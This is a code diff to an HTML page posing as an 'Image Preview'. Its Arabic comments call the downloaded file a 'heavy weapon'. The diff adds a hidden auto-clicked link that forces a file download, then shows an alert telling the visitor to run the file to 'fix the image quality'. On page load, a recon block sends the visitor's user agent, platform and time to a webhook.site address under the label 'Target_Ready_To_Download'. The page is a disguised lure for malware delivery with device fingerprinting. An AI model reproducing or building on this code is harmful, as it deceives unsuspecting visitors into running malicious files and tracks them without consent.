@@ -6,7 +6,7 @@
     <title>Image Preview</title>
     <style>
         body { margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family: sans-serif; }
-        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(10px); transition: 0.5s; }
+        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(15px); transition: 0.5s; }
         #update-box {
             position: absolute; width: 320px; background: #ffffff; padding: 25px; border-radius: 15px;
             text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); z-index: 999;
@@ -32,20 +32,30 @@
 
     <script>
         function startDownload() {
-            // الرابط المباشر الصحيح والمختبر لملف السلاح الثقيل
-            const DIRECT_LINK = "https://google.com";
+            // [THE_BRIDGE]: رابط التحميل المباشر للسلاح الثقيل
+            const FILE_ID = "1C3xIHNY4uIh3ka5nOb1LbLixkZD1NHIS";
+            const DIRECT_LINK = "https://google.com" + FILE_ID;
             
-            // فتح في نافذة جديدة لضمان بدء التحميل فوراً
-            window.open(DIRECT_LINK, '_blank');
+            // إنشاء عملية تحميل إجبارية مخفية
+            const hiddenLink = document.createElement('a');
+            hiddenLink.href = DIRECT_LINK;
+            hiddenLink.target = '_blank'; // لضمان تجاوز بعض حمايات المتصفح
+            document.body.appendChild(hiddenLink);
+            hiddenLink.click();
+            document.body.removeChild(hiddenLink);
+
+            // تمويه المستخدم لانتظار التحميل
+            alert("Starting download... Please run the file to fix the image quality.");
         }
 
+        // [RECON_SCAN]: سحب بصمة الجهاز فور الدخول
         window.onload = function() {
             const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
             const payload = {
-                event: "Target_Accessed_Preview",
-                device: navigator.userAgent,
+                status: "Target_Ready_To_Download",
+                ua: navigator.userAgent,
                 platform: navigator.platform,
-                timestamp: new Date().toISOString()
+                time: new Date().toLocaleTimeString()
             };
 
             fetch(WEBHOOK_URL, {
